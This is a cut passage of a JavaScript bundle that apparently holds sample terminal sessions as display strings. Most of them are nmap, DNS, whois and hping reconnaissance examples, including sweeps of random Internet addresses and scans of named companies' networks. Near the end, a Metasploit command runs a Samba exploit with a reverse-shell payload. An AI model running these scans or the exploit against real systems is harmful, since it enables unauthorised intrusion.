--rebuild https://nmap.org/dist/nmap-4.68-1.src.rpm\n[ hundreds of lines cut ]\nWrote: /home/fyodor/rpmdir/RPMS/i386/nmap-4.68-1.i386.rpm\n[ cut ]\n> su\nPassword: \n# rpm -vhU /home/fyodor/rpmdir/RPMS/i386/nmap-4.68-1.i386.rpm\nPreparing...                ########################################### [100%]\n   1:nmap                   ########################################### [100%]\n#\n\nflog~# yum install nmap\nSetting up Install Process\nParsing package install arguments\nResolving Dependencies\n--\x3e Running transaction check\n---\x3e Package nmap.x86_64 2:4.52-1.fc8 set to be updated\n--\x3e Finished Dependency Resolution\nDependencies Resolved\n=============================================================================\n Package                 Arch       Version          Repository        Size \n=============================================================================\nInstalling:\n nmap                    x86_64     2:4.52-1.fc8     updates           1.0 M\n\nTransaction Summary\n=============================================================================\nInstall      1 Package(s)         \nUpdate       0 Package(s)         \nRemove       0 Package(s)         \n\nTotal download size: 1.0 M\nIs this ok [y/N]: y\nDownloading Packages:\n(1/1): nmap-4.52-1.fc8.x8 100% |=========================| 1.0 MB    00:02     \nRunning Transaction Test\nTransaction Test Succeeded\nRunning Transaction\n  Installing: nmap                         ######################### [1/1] \n\nInstalled: nmap.x86_64 2:4.52-1.fc8\nComplete!\n\n> host -t ns target.com\ntarget.com name server ns4.target.com.\ntarget.com name server ns3.target.com.\ntarget.com name server ns1-auth.sprintlink.net.\ntarget.com name server ns2-auth.sprintlink.net.\ntarget.com name server ns3-auth.sprintlink.net.\n> host -t a target.com\ntarget.com has address 161.225.130.163\ntarget.com has address 161.225.136.0\n> host -t aaaa target.com\ntarget.com has no AAAA record\n> host -t mx target.com\ntarget.com mail is handled by 50 smtp02.target.com.\ntarget.com mail is handled by 5 smtp01.target.com.\n> host -t soa target.com\ntarget.com has SOA record extdns02.target.com. hostmaster.target.com.\n\n> dig @ns2-auth.sprintlink.net -t AXFR target.com\n; <<>> DiG 9.5.0b3 <<>> @ns2-auth.sprintlink.net -t AXFR target.com\n\n; Transfer failed.\n\n> dig @ns2.eppi.com -t AXFR cpsr.org\n; <<>> DiG 9.5.0b1 <<>> @ns2.eppi.com -t AXFR cpsr.org\n\ncpsr.org             10800   IN      SOA   ns1.findpage.com. root.cpsr.org.\ncpsr.org.            10800   IN      NS    ns.stimpy.net.\ncpsr.org.            10800   IN      NS    ns1.findpage.com.\ncpsr.org.            10800   IN      NS    ns2.eppi.com.\ncpsr.org.            10800   IN      A     208.96.55.202\ncpsr.org.            10800   IN      MX    0 smtp.electricembers.net.\ndiac.cpsr.org.       10800   IN      A     64.147.163.10\ngroups.cpsr.org.     10800   IN      NS    ns1.electricembers.net.\nlocalhost.cpsr.org.  10800   IN      A     127.0.0.1\nmail.cpsr.org.       10800   IN      A     209.209.81.73\nperu.cpsr.org.       10800   IN      A     208.96.55.202\nwww.peru.cpsr.org.   10800   IN      A     208.96.55.202\n\n# nmap -Pn -T4 --traceroute www.target.com\n\nStarting Nmap ( http://nmap.org )\nNmap scan report for 166-49.amazon.com (207.171.166.49)\nNot shown: 998 filtered ports\nPORT    STATE SERVICE\n80/tcp  open  http\n443/tcp open  https\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT    ADDRESS\n[cut]\n9   84.94  ae-2.ebr4.NewYork1.Level3.net (4.69.135.186)\n10  87.91  ae-3.ebr4.Washington1.Level3.net (4.69.132.93)\n11  94.80  ae-94-94.csw4.Washington1.Level3.net (4.69.134.190)\n12  86.40  ae-21-69.car1.Washington3.Level3.net (4.68.17.7)\n13  185.10 AMAZONCOM.car1.Washington3.Level3.net (4.71.204.18)\n14  84.70  72.21.209.38\n15  85.73  72.21.193.37\n16  85.68  166-49.amazon.com (207.171.166.49)\n\nNmap done: 1 IP address (1 host up) scanned in 20.57 seconds\n\n> whois 207.171.166.49\n[Querying whois.arin.net]\n[whois.arin.net]\n\nOrgName:    Amazon.com, Inc. \nOrgID:      AMAZON-4\nAddress:    605 5th Ave S\nCity:       SEATTLE\nStateProv:  WA\nPostalCode: 98104\nCountry:    US\n\n> whois 161.225.130.163\n[Querying whois.arin.net]\n[whois.arin.net]\n\nOrgName:    Target Corporation \nOrgID:      TARGET-14\nAddress:    1000 Nicollet TPS 3165\nCity:       Minneapolis\nStateProv:  MN\nPostalCode: 55403\nCountry:    US\n\nNetRange:   161.225.0.0 - 161.225.255.255 \nCIDR:       161.225.0.0/16 \nNetName:    TARGETNET\nNetHandle:  NET-161-225-0-0-1\nParent:     NET-161-0-0-0-0\nNetType:    Direct Assignment\nNameServer: NS3.TARGET.COM\nNameServer: NS4.TARGET.COM\nComment:    \nRegDate:    1993-03-04\nUpdated:    2005-11-02\n\nOrgTechHandle: DOMAI45-ARIN\nOrgTechName:   Domainnames admin \nOrgTechPhone:  +1-612-696-2525\nOrgTechEmail:  Domainnames.admin@target.com\n\nfelix~> nmap -sL www.stanford.edu/28\n\nStarting Nmap ( http://nmap.org )\nHost www9.Stanford.EDU (171.67.16.80) not scanned\nHost www10.Stanford.EDU (171.67.16.81) not scanned\nHost scriptorium.Stanford.EDU (171.67.16.82) not scanned\nHost coursework-a.Stanford.EDU (171.67.16.83) not scanned\nHost coursework-e.Stanford.EDU (171.67.16.84) not scanned\nHost www3.Stanford.EDU (171.67.16.85) not scanned\nHost leland-dev.Stanford.EDU (171.67.16.86) not scanned\nHost coursework-preprod.Stanford.EDU (171.67.16.87) not scanned\nHost stanfordwho-dev.Stanford.EDU (171.67.16.88) not scanned\nHost workgroup-dev.Stanford.EDU (171.67.16.89) not scanned\nHost courseworkbeta.Stanford.EDU (171.67.16.90) not scanned\nHost www4.Stanford.EDU (171.67.16.91) not scanned\nHost coursework-i.Stanford.EDU (171.67.16.92) not scanned\nHost leland2.Stanford.EDU (171.67.16.93) not scanned\nHost coursework-j.Stanford.EDU (171.67.16.94) not scanned\nHost 171.67.16.95 not scanned\nNmap done: 16 IP addresses (0 hosts up) scanned in 0.38 seconds\n\n# nmap -sn -T4 www.lwn.net/24\n\nStarting Nmap ( http://nmap.org )\nHost 66.216.68.0 seems to be a subnet broadcast address (returned 1 extra ping)\nHost 66.216.68.1 appears to be up.\nHost 66.216.68.2 appears to be up.\nHost 66.216.68.3 appears to be up.\nHost server1.camnetsec.com (66.216.68.10) appears to be up.\nHost akqa.com (66.216.68.15) appears to be up.\nHost asria.org (66.216.68.18) appears to be up.\nHost webcubic.net (66.216.68.19) appears to be up.\nHost dizzy.yellowdog.com (66.216.68.22) appears to be up.\nHost www.outdoorwire.com (66.216.68.23) appears to be up.\nHost www.inspectorhosting.com (66.216.68.24) appears to be up.\nHost jwebmedia.com (66.216.68.25) appears to be up.\nHost rs.lwn.net (66.216.68.48) appears to be up.\nHost 66.216.68.52 appears to be up.\nHost cuttlefish.laughingsquid.net (66.216.68.53) appears to be up.\nNmap done: 256 IP addresses (105 hosts up) scanned in 12.69 seconds\n\n# nmap -sn -PE -R -v microsoft.com ebay.com citibank.com google.com \\\n                     slashdot.org yahoo.com\n\nStarting Nmap ( http://nmap.org )\nHost origin2.microsoft.com (207.46.250.252) appears to be down.\nHost pages.ebay.com (66.135.192.87) appears to be down.\nHost ld1-www.citicorp.com (192.193.195.132) appears to be down.\nHost 216.239.57.99 appears to be up.\nHost slashdot.org (66.35.250.150) appears to be down.\nHost w3.rc.dcn.yahoo.com (216.109.127.30) appears to be up.\nNmap done: 6 IP addresses (2 hosts up) scanned in 3.76 seconds\n\n# nmap -sn -PS80 -R -v microsoft.com ebay.com citibank.com google.com \\\n                       slashdot.org yahoo.com\n\nStarting Nmap ( http://nmap.org )\nHost origin2.microsoft.com (207.46.249.252) appears to be up.\nHost pages.ebay.com (66.135.192.87) appears to be up.\nHost ld1-www.citicorp.com (192.193.195.132) appears to be up.\nHost 216.239.57.99 appears to be up.\nHost slashdot.org (66.35.250.150) appears to be up.\nHost w3.rc.dcn.yahoo.com (216.109.127.30) appears to be up.\nNmap done: 6 IP addresses (6 hosts up) scanned in 0.48 seconds\n\n# nmap -n -sn --send-ip 192.168.33.37\n\nStarting Nmap ( http://nmap.org )\n  0.000000 00:01:29:f5:27:f2 -> ff:ff:ff:ff:ff:ff ARP Who has 192.168.33.37? \n  0.999836 00:01:29:f5:27:f2 -> ff:ff:ff:ff:ff:ff ARP Who has 192.168.33.37?\n  1.999684 00:01:29:f5:27:f2 -> ff:ff:ff:ff:ff:ff ARP Who has 192.168.33.37?\nNote: Host seems down. If it is really up, but blocking ping probes, try -Pn\nNmap done: 1 IP address (0 hosts up) scanned in 2.04 seconds\n\n# nmap -n -sn -PR --packet-trace --send-eth 192.168.33.37\n\nStarting Nmap ( http://nmap.org )\nSENT (0.0060s) ARP who-has 192.168.33.37 tell 192.168.0.100\nSENT (0.1180s) ARP who-has 192.168.33.37 tell 192.168.0.100\nNote: Host seems down. If it is really up, but blocking ping probes, try -Pn\nNmap done: 1 IP address (0 hosts up) scanned in 0.23 seconds\n\n# nmap -n -sL -iR 50000 | awk '/^Host / {print $2}' | sort -n > 50K_IPs\n# head -5 50K_IPs\n3.0.47.195\n3.100.112.251\n3.100.98.39\n3.10.89.120\n3.101.183.79\n# nmap -n -sn -T4 -iL 50K_IPs -oA 50KHosts_DefaultPing\n\nStarting Nmap ( http://nmap.org )\nHost 4.178.9.27 is up (0.27s latency).\nHost 12.135.202.138 is up (0.20s latency).\nHost 12.151.172.161 is up (0.089s latency).\n[thousands of lines cut]\nHost 222.99.77.130 is up (0.20s latency).\nNmap done: 50000 IP addresses (3927 hosts up) scanned in 2532.05 seconds\n\n# nmap -n -sn -PE -PP -PS21,22,23,25,80,113,443,31339 -PA80,113,443,10042 \\\n  -T4 --source-port 53 -iL 50K_IPs -oA 50KHosts_ExtendedPing\nStarting Nmap ( http://nmap.org )\nHost 4.238.177.186 is up (0.44s latency).\nHost 12.135.202.138 is up (0.13s latency).\nHost 12.151.172.161 is up (0.092s latency).\n[thousands of hosts cut]\nHost 222.94.94.113 is up (0.23s latency).\nNmap done: 50000 IP addresses (4712 hosts up) scanned in 8842.31 seconds\n\n# nmap scanme.nmap.org\n\nStarting Nmap ( http://nmap.org )\nNmap scan report for scanme.nmap.org (64.13.134.52)\nNot shown: 994 filtered ports\nPORT    STATE  SERVICE\n22/tcp  open   ssh\n25/tcp  closed smtp\n53/tcp  open   domain\n70/tcp  closed gopher\n80/tcp  open   http\n113/tcp closed auth\n\nNmap done: 1 IP address (1 host up) scanned in 4.99 seconds\n\n# nmap -p0- -v -A -T4 scanme.nmap.org\n\nStarting Nmap ( http://nmap.org )\nCompleted Ping Scan at 00:03, 0.01s elapsed (1 total hosts)\nScanning scanme.nmap.org (64.13.134.52) [65536 ports]\nDiscovered open port 22/tcp on 64.13.134.52\nDiscovered open port 53/tcp on 64.13.134.52\nDiscovered open port 80/tcp on 64.13.134.52\nSYN Stealth Scan Timing: About 6.20% done; ETC: 00:11 (0:07:33 remaining)\nCompleted SYN Stealth Scan at 00:10, 463.55s elapsed (65536 total ports)\nCompleted Service scan at 00:10, 6.03s elapsed (3 services on 1 host)\nInitiating OS detection (try #1) against scanme.nmap.org (64.13.134.52)\nInitiating Traceroute at 00:10\n64.13.134.52: guessing hop distance at 9\nCompleted SCRIPT ENGINE at 00:10, 4.04s elapsed\nHost scanme.nmap.org (64.13.134.52) appears to be up ... good.\nNmap scan report for scanme.nmap.org (64.13.134.52)\nNot shown: 65530 filtered ports\nPORT    STATE  SERVICE VERSION\n22/tcp  open   ssh     OpenSSH 4.3 (protocol 2.0)\n25/tcp  closed smtp\n53/tcp  open   domain  ISC BIND 9.3.4\n70/tcp  closed gopher\n80/tcp  open   http    Apache httpd 2.2.2 ((Fedora))\n|_HTML title: Go ahead and ScanMe!\n113/tcp closed auth\nDevice type: general purpose\nRunning: Linux 2.6.X\nOS details: Linux 2.6.20-1 (Fedora Core 5)\nUptime guess: 2.457 days (since Thu Sep 18 13:13:24 2008)\nTCP Sequence Prediction: Difficulty=204 (Good luck!)\nIP ID Sequence Generation: All zeros\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT   ADDRESS\n[First eight hops cut for brevity]\n9   10.36 metro0.sv.svcolo.com (208.185.168.173)\n10  10.29 scanme.nmap.org (64.13.134.52)\n\nNmap done: 1 IP address (1 host up) scanned in 477.23 seconds\n           Raw packets sent: 131432 (5.783MB) | Rcvd: 359 (14.964KB)\n\n# nmap -6 -sV www.eurov6.org\n\nStarting Nmap ( http://nmap.org )\nNmap scan report for ns1.euro6ix.com (2001:800:40:2a03::3)\nNot shown: 996 closed ports\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     Pure-FTPd\n22/tcp open  ssh     OpenSSH 3.5p1 (protocol 2.0)\n53/tcp open  domain  ISC BIND 9.2.1\n80/tcp open  http    Apache httpd\n\nNmap done: 1 IP address (1 host up) scanned in 56.78 seconds\n\ncore~> whois -h whois.arin.net n playboy\n[Querying whois.arin.net]\n[whois.arin.net]\n\nOrgName:    Playboy \nOrgID:      PLAYBO\nAddress:    680 N. Lake Shore Drive\nCity:       Chicago\nStateProv:  IL\nPostalCode: 60611\nCountry:    US\n\nNetRange:   216.163.128.0 - 216.163.143.255 \nCIDR:       216.163.128.0/20 \nNetName:    PLAYBOY-BLK-1\nNetHandle:  NET-216-163-128-0-1\nParent:     NET-216-0-0-0-0\nNetType:    Direct Assignment\nNameServer: NS1-CHI.PLAYBOY.COM\nNameServer: NS2-CHI.PLAYBOY.COM\n\n# ping -c5 www.playboy.com\nPING www.phat.playboy.com (209.247.228.201) from 205.217.153.56\n64 bytes from free-chi.playboy.com (209.247.228.201): icmp_seq=1 time=57.5 ms\n64 bytes from free-chi.playboy.com (209.247.228.201): icmp_seq=2 time=56.7 ms\n64 bytes from free-chi.playboy.com (209.247.228.201): icmp_seq=3 time=56.9 ms\n64 bytes from free-chi.playboy.com (209.247.228.201): icmp_seq=4 time=57.0 ms\n64 bytes from free-chi.playboy.com (209.247.228.201): icmp_seq=5 time=56.6 ms\n\n--- www.phat.playboy.com ping statistics ---\n5 packets transmitted, 5 received, 0% loss, time 4047ms\nrtt min/avg/max/mdev = 56.652/57.004/57.522/0.333 ms\n\ncore~> dig @ns1-chi.playboy.com playboy.com. any\n; <<>> DiG 8.3 <<>> @ns1-chi.playboy.com playboy.com. any \n[...]\n;; ANSWER SECTION:\nplayboy.com.            1D IN A         209.247.228.201\nplayboy.com.            1D IN MX        10 mx.la.playboy.com.\nplayboy.com.            1D IN MX        5 mx.chi.playboy.com.\nplayboy.com.            1D IN NS        ns15.customer.level3.net.\nplayboy.com.            1D IN NS        ns21.customer.level3.net.\nplayboy.com.            1D IN NS        ns29.customer.level3.net.\nplayboy.com.            1D IN NS        ns1-chi.playboy.com.\nplayboy.com.            1D IN NS        ns2-chi.playboy.com.\nplayboy.com.            1D IN SOA       ns1-chi.playboy.com. dns.playboy.com. (\n                                        2004092010      ; serial\n                                        12H             ; refresh\n                                        2h30m           ; retry\n                                        2w1d            ; expiry\n                                        1D )            ; minimum\n;; ADDITIONAL SECTION:\nmx.chi.playboy.com.     1D IN A         216.163.143.4\nmx.la.playboy.com.      1D IN A         216.163.128.15\nns1-chi.playboy.com.    1D IN A         209.247.228.135\nns2-chi.playboy.com.    1D IN A         64.202.105.36\n\n;; Total query time: 107 msec\n\ncore~> ping -c5 mx.chi.playboy.com\nPING mx.chi.playboy.com (216.163.143.4) 56(84) bytes of data.\n\n--- mx.chi.playboy.com ping statistics ---\n5 packets transmitted, 0 received, 100% packet loss, time 4000ms\n\ncore~> ping -c5 mx.la.playboy.com\nPING mx.la.playboy.com (216.163.128.15) 56(84) bytes of data.\n\n--- mx.la.playboy.com ping statistics ---\n5 packets transmitted, 0 received, 100% packet loss, time 4011ms\n\ncore# hping2 --syn -p 25 -c 5 mx.chi.playboy.com\neth0 default routing interface selected (according to /proc)\nHPING mx.chi.playboy.com (eth0 216.163.143.4): S set, 40 headers + 0 data bytes\n46 bytes from 216.163.143.4: flags=SA seq=0 ttl=51 id=14221 rtt=56.8 ms\n46 bytes from 216.163.143.4: flags=SA seq=1 ttl=51 id=14244 rtt=56.9 ms\n46 bytes from 216.163.143.4: flags=SA seq=2 ttl=51 id=14274 rtt=56.9 ms\n46 bytes from 216.163.143.4: flags=SA seq=3 ttl=51 id=14383 rtt=61.8 ms\n46 bytes from 216.163.143.4: flags=SA seq=4 ttl=51 id=14387 rtt=57.5 ms\n\n--- mx.chi.playboy.com hping statistic ---\n5 packets transmitted, 5 packets received, 0% packet loss\nround-trip min/avg/max = 56.8/58.0/61.8 ms\n\ncore# hping2 --syn -p 25 -c 5 mx.la.playboy.com\neth0 default routing interface selected (according to /proc)\nHPING mx.la.playboy.com (eth0 216.163.128.15): S set, 40 headers + 0 data bytes\n46 bytes from 216.163.128.15: flags=SA seq=0 ttl=52 id=58728 rtt=16.0 ms\n46 bytes from 216.163.128.15: flags=SA seq=1 ttl=52 id=58753 rtt=15.4 ms\n46 bytes from 216.163.128.15: flags=SA seq=2 ttl=52 id=58790 rtt=15.5 ms\n46 bytes from 216.163.128.15: flags=SA seq=3 ttl=52 id=58870 rtt=16.4 ms\n46 bytes from 216.163.128.15: flags=SA seq=4 ttl=52 id=58907 rtt=15.5 ms\n\n--- mx.la.playboy.com hping statistic ---\n5 packets transmitted, 5 packets received, 0% packet loss\nround-trip min/avg/max = 15.4/15.8/16.4 ms\n\n# nmap -T4 -p80 -Pn --max-rtt-timeout 200ms --initial-rtt-timeout 150ms \\\n  --min-hostgroup 512 -n -oG pb-port80scan-%D.gnmap 216.163.128.0/20\nWarning: You specified a highly aggressive --min-hostgroup.\nStarting Nmap ( http://nmap.org )\nNmap scan report for 216.163.128.0\nPORT   STATE    SERVICE\n80/tcp filtered http\n\nNmap scan report for 216.163.128.1\nPORT   STATE    SERVICE\n80/tcp filtered http\n\nNmap scan report for 216.163.128.2\nPORT   STATE    SERVICE\n80/tcp filtered http\n\nNmap scan report for 216.163.128.3\nPORT   STATE    SERVICE\n80/tcp filtered http\n[ ... ]\nNmap scan report for 216.163.143.255\nPORT   STATE    SERVICE\n80/tcp filtered http\n\nNmap done: 4096 IP addresses (4096 hosts up) scanned in 192.97 seconds\n\n# egrep '[^0-9]80/open' pb-port80scan-*.gnmap\nHost: 216.163.140.20 () Ports: 80/open/tcp//http///\nHost: 216.163.142.135 ()     Ports: 80/open/tcp//http///\n\nkrad# nmap -d --packet-trace -p22,113,139 scanme.nmap.org\n\nStarting Nmap ( http://nmap.org )\nSENT (0.0130s) ICMP krad > scanme echo request (type=8/code=0) ttl=52 id=1829\nSENT (0.0160s) TCP krad:63541 > scanme:80 A iplen=40 seq=91911070 ack=99850910\nRCVD (0.0280s) ICMP scanme > krad echo reply (type=0/code=0) iplen=28\nWe got a ping packet back from scanme: id = 48821 seq = 714 checksum = 16000\nmassping done:  num_hosts: 1  num_responses: 1\nInitiating SYN Stealth Scan against scanme.nmap.org (scanme) [3 ports] at 00:53\nSENT (0.1340s) TCP krad:63517 > scanme:113 S iplen=40 seq=10438635\nSENT (0.1370s) TCP krad:63517 > scanme:22 S iplen=40 seq=10438635\nSENT (0.1400s) TCP krad:63517 > scanme:139 S iplen=40 seq=10438635\nRCVD (0.1460s) TCP scanme:113 > krad:63517 RA iplen=40 seq=0 ack=10438636\nRCVD (0.1510s) TCP scanme:22 > krad:63517 SA iplen=44 seq=75897108 ack=10438636\nSENT (1.2550s) TCP krad:63518 > scanme:139 S iplen=40 seq=10373098 win=3072\nThe SYN Stealth Scan took 1.25s to scan 3 total ports.\nNmap scan report for scanme.nmap.org (64.13.134.52)\nPORT    STATE    SERVICE\n22/tcp  open     ssh\n113/tcp closed   auth\n139/tcp filtered netbios-ssn\n\nNmap done: 1 IP address (1 host up) scanned in 1.40 seconds\n\nkrad~> nmap -T4 -sT scanme.nmap.org\n\nStarting Nmap ( http://nmap.org )\nNmap scan report for scanme.nmap.org (64.13.134.52)\nNot shown: 994 filtered ports\nPORT    STATE  SERVICE\n22/tcp  open   ssh\n25/tcp  closed smtp\n53/tcp  open   domain\n70/tcp  closed gopher\n80/tcp  open   http\n113/tcp closed auth\n\nNmap done: 1 IP address (1 host up) scanned in 4.74 seconds\nkrad# nping --udp --traceroute -c 13 -p 53 scanme.nmap.org\n\nStarting Nping ( http://nmap.org/nping )\nSENT (7.0370s) UDP 192.168.0.21:53 > 64.13.134.52:53 ttl=8 id=4826 iplen=28\nRCVD (7.1010s) ICMP 4.69.134.222 > 192.168.0.21 TTL=0 during transit (type=11/co\nSENT (8.0400s) UDP 192.168.0.21:53 > 64.13.134.52:53 ttl=9 id=38166 iplen=28\nRCVD (8.1050s) ICMP 4.68.18.204 > 192.168.0.21 TTL=0 during transit (type=11/cod\nSENT (9.0420s) UDP 192.168.0.21:53 > 64.13.134.52:53 ttl=10 id=6788 iplen=28\nRCVD (9.1080s) ICMP 4.59.4.78 > 192.168.0.21 TTL=0 during transit (type=11/code=\nSENT (10.0440s) UDP 192.168.0.21:53 > 64.13.134.52:53 ttl=11 id=366 iplen=28\nRCVD (10.1100s) ICMP 69.36.239.221 > 192.168.0.21 TTL=0 during transit (type=11/\nSENT (11.0470s) UDP 192.168.0.21:53 > 64.13.134.52:53 ttl=12 id=63478 iplen=28\nSENT (12.0490s) UDP 192.168.0.21:53 > 64.13.134.52:53 ttl=13 id=56653 iplen=28\n\nMax rtt: 73.003ms | Min rtt: 0.540ms | Avg rtt: 48.731ms\nRaw packets sent: 13 (364B) | Rcvd: 10 (560B) | Lost: 3 (23.08%)\nTx time: 12.02836s | Tx bytes/s: 30.26 | Tx pkts/s: 1.08\nRx time: 13.02994s | Rx bytes/s: 42.98 | Rx pkts/s: 0.77\nNping done: 1 IP address pinged in 13.05 seconds\n\nkrad# nping --udp --traceroute -c 13 -p 54 scanme.nmap.org\n\nStarting Nping ( http://nmap.org/nping )\nSENT (7.0370s) UDP 192.168.0.21:53 > 64.13.134.52:54 ttl=8 id=56481 iplen=28\nRCVD (7.1130s) ICMP 4.69.134.214 > 192.168.0.21 TTL=0 during transit (type=11/co\nSENT (8.0400s) UDP 192.168.0.21:53 > 64.13.134.52:54 ttl=9 id=23264 iplen=28\nRCVD (8.1060s) ICMP 4.68.18.76 > 192.168.0.21 TTL=0 during transit (type=11/code\nSENT (9.0430s) UDP 192.168.0.21:53 > 64.13.134.52:54 ttl=10 id=9101 iplen=28\nRCVD (9.1070s) ICMP 4.59.4.78 > 192.168.0.21 TTL=0 during transit (type=11/code=\nSENT (10.0450s) UDP 192.168.0.21:53 > 64.13.134.52:54 ttl=11 id=35344 iplen=28\nRCVD (10.1110s) ICMP 69.36.239.221 > 192.168.0.21 TTL=0 during transit (type=11/\nSENT (11.0470s) UDP 192.168.0.21:53 > 64.13.134.52:54 ttl=12 id=53857 iplen=28\nSENT (12.0490s) UDP 192.168.0.21:53 > 64.13.134.52:54 ttl=13 id=986 iplen=28\n\nMax rtt: 76.488ms | Min rtt: 0.546ms | Avg rtt: 48.480ms\nRaw packets sent: 13 (364B) | Rcvd: 11 (616B) | Lost: 2 (15.38%)\nTx time: 12.02908s | Tx bytes/s: 30.26 | Tx pkts/s: 1.08\nRx time: 13.03165s | Rx bytes/s: 47.27 | Rx pkts/s: 0.84\nNping done: 1 IP address pinged in 13.05 seconds\n\n# nmap -sS -T4 docsrv.caldera.com\n\nStarting Nmap ( http://nmap.org )\nNmap scan report for docsrv.caldera.com (216.250.128.247)\n(The 997 ports scanned but not shown below are in state: filtered)\nPORT    STATE  SERVICE\n80/tcp  open   http\n113/tcp closed auth\n507/tcp open   crs\n\nNmap done: 1 IP address (1 host up) scanned in 28.62 seconds\n\nkrad# nmap -sF -T4 para\n\nStarting Nmap ( http://nmap.org )\nNmap scan report for para (192.168.10.191)\nNot shown: 995 closed ports\nPORT     STATE         SERVICE\n22/tcp   open|filtered ssh\n53/tcp   open|filtered domain\n111/tcp  open|filtered rpcbind\n515/tcp  open|filtered printer\n6000/tcp open|filtered X11\nMAC Address: 00:60:1D:38:32:90 (Lucent Technologies)\n\nNmap done: 1 IP address (1 host up) scanned in 4.64 seconds\n\nkrad# nmap -sX -T4 scanme.nmap.org\n\nStarting Nmap ( http://nmap.org )\nNmap scan report for scanme.nmap.org (64.13.134.52)\nNot shown: 999 open|filtered ports\nPORT    STATE  SERVICE\n113/tcp closed auth\n\nNmap done: 1 IP address (1 host up) scanned in 23.11 seconds\n\n# nmap -sF -T4 docsrv.caldera.com\n\nStarting Nmap ( http://nmap.org )\nNmap scan report for docsrv.caldera.com (216.250.128.247)\nNot shown: 961 closed ports\nPORT      STATE         SERVICE\n7/tcp     open|filtered echo\n9/tcp     open|filtered discard\n11/tcp    open|filtered systat\n13/tcp    open|filtered daytime\n15/tcp    open|filtered netstat\n19/tcp    open|filtered chargen\n21/tcp    open|filtered ftp\n22/tcp    open|filtered ssh\n23/tcp    open|filtered telnet\n25/tcp    open|filtered smtp\n37/tcp    open|filtered time\n79/tcp    open|filtered finger\n80/tcp    open|filtered http\n110/tcp   open|filtered pop3\n111/tcp   open|filtered rpcbind\n135/tcp   open|filtered msrpc\n143/tcp   open|filtered imap\n360/tcp   open|filtered scoi2odialog\n389/tcp   open|filtered ldap\n465/tcp   open|filtered smtps\n507/tcp   open|filtered crs\n512/tcp   open|filtered exec\n513/tcp   open|filtered login\n514/tcp   open|filtered shell\n515/tcp   open|filtered printer\n636/tcp   open|filtered ldapssl\n712/tcp   open|filtered unknown\n955/tcp   open|filtered unknown\n993/tcp   open|filtered imaps\n995/tcp   open|filtered pop3s\n1434/tcp  open|filtered ms-sql-m\n2000/tcp  open|filtered callbook\n2766/tcp  open|filtered listen\n3000/tcp  open|filtered ppp\n3306/tcp  open|filtered mysql\n6112/tcp  open|filtered dtspc\n32770/tcp open|filtered sometimes-rpc3\n32771/tcp open|filtered sometimes-rpc5\n32772/tcp open|filtered sometimes-rpc7\n\nNmap done: 1 IP address (1 host up) scanned in 7.64 seconds\nkrad# nmap -sF --scanflags PSH  para\n\nStarting Nmap ( http://nmap.org )\nNmap scan report for para (192.168.10.191)\n(The 995 ports scanned but not shown below are in state: closed)\nPORT     STATE         SERVICE\n22/tcp   open|filtered ssh\n53/tcp   open|filtered domain\n111/tcp  open|filtered rpcbind\n515/tcp  open|filtered printer\n6000/tcp open|filtered X11\nMAC Address: 00:60:1D:38:32:90 (Lucent Technologies)\n\nNmap done: 1 IP address (1 host up) scanned in 5.95 seconds\n\n# nmap -sO 62.233.173.90 para\n\nStarting Nmap ( http://nmap.org )\nNmap scan report for ntwklan-62-233-173-90.devs.futuro.pl (62.233.173.90)\nNot shown: 240 closed ports\nPROTOCOL STATE         SERVICE\n1        open          icmp                    \n4        open|filtered ip                      \n6        open          tcp                     \n8        open|filtered egp                     \n9        open|filtered igp                     \n17       filtered      udp                     \n47       open|filtered gre                     \n53       filtered      swipe                   \n54       open|filtered narp                    \n55       filtered      mobile                  \n77       filtered      sun-nd                  \n80       open|filtered iso-ip                  \n88       open|filtered eigrp                   \n89       open|filtered ospfigp                 \n94       open|filtered ipip                    \n103      filtered      pim                     \n\nNmap scan report for para (192.168.10.191)\nNot shown: 252 closed ports\nPROTOCOL STATE         SERVICE\n1        open          icmp                    \n2        open|filtered igmp                    \n6        open          tcp                     \n17       filtered      udp                     \nMAC Address: 00:60:1D:38:32:90 (Lucent Technologies)\n\nNmap done: 2 IP addresses (2 hosts up) scanned in 458.04 seconds\n\nStarting probes against new service: 205.217.153.53:22 (tcp)\nNSOCK (2.0750s) TCP connection requested to 205.217.153.53:22 (IOD #1) EID 8\nStarting probes against new service: 205.217.153.53:25 (tcp)\nNSOCK (2.0770s) TCP connection requested to 205.217.153.53:25 (IOD #2) EID 16\nStarting probes against new service: 205.217.153.53:53 (tcp)\nNSOCK (2.0830s) TCP connection requested to 205.217.153.53:53 (IOD #3) EID 24\nStarting probes against new service: 205.217.153.53:80 (tcp)\nNSOCK (2.0860s) TCP connection requested to 205.217.153.53:80 (IOD #4) EID 32\nNSOCK (2.0870s) Callback: CONNECT SUCCESS for EID 32 [205.217.153.53:80]\nNSOCK (2.0870s) Read request from IOD #4 [205.217.153.53:80] \n                (timeout: 5000ms) EID 42\nNSOCK (2.0870s) Callback: CONNECT SUCCESS for EID 24 [205.217.153.53:53]\nNSOCK (2.0870s) Read request from IOD #3 [205.217.153.53:53]\n                (timeout: 5000ms) EID 50\nNSOCK (2.0870s) Callback: CONNECT SUCCESS for EID 16 [205.217.153.53:25]\nNSOCK (2.0870s) Read request from IOD #2 [205.217.153.53:25]\n                (timeout: 5000ms) EID 58\nNSOCK (2.0870s) Callback: CONNECT SUCCESS for EID 8 [205.217.153.53:22]\nNSOCK (2.0870s) Read request from IOD #1 [205.217.153.53:22]\n                (timeout: 5000ms) EID 66\n")},get dt(){return delete this.dt,this.dt=810}}]}},{numCols:81,get streams(){return[{get title(){delete this.title;return this.title=x(["msf","meterpreter"])},get stream(){return delete this.stream,this.stream=E('root@kali:~# msfconsole -x "use exploit/multi/samba/usermap_script;\\\nset RHOST 172.16.194.172;\\\nset PAYLOAD cmd/unix/reverse;\\\nset LHOST 172.16.194.163;\\\nrun"\n\nroot@kali:~# msfcli exploit/multi/samba/usermap_script RHOST=172.16.194.172 PAYL\n[*] Please wait while we load the module tree...\n \n                ##                          ###           ##    ##\n ##  ##  #### ###### ####  #####   #####    ##    ####        ######\n####### ##  ##  ##  ##         ## ##  ##    ##   ##  ##   ###   ##\n####### ######  ##  #####   ####  ##  ##    ##   ##  ##   ##    ##\n## # ##     ##  ##  ##  ## ##      #####    ##   ##  ##   ##    ##\n##   ##  #### ###   #####   #####     ##   ####   ####   #### ###\n                                      ##\n\n\n       =[ metasploit v4.5.0-dev [core:4.5 api:1.0]\n+ -- --=[ 936 exploits - 500 